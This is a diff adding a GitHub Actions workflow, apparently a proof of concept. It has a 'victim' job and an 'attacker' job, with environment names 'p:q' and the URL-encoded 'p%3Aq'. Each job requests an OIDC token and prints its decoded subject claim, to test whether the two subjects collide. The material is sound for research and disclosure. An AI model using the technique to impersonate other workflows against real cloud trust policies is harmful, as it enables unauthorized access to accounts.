@@ -1,0 +1,19 @@
+name: oidc-poc
+on: workflow_dispatch
+permissions:
+  id-token: write
+jobs:
+  victim_env:
+    runs-on: ubuntu-latest
+    environment: "p:q"
+    steps:
+      - run: |
+          S=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=x" | python3 -c "import sys,json,base64;t=json.load(sys.stdin)['value'].split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t))['sub'])")
+          echo "POC victim(p:q) SUB= $S"
+  attacker_env:
+    runs-on: ubuntu-latest
+    environment: "p%3Aq"
+    steps:
+      - run: |
+          S=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=x" | python3 -c "import sys,json,base64;t=json.load(sys.stdin)['value'].split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t))['sub'])")
+          echo "POC attacker(p%3Aq->obj p%3aq) SUB= $S"
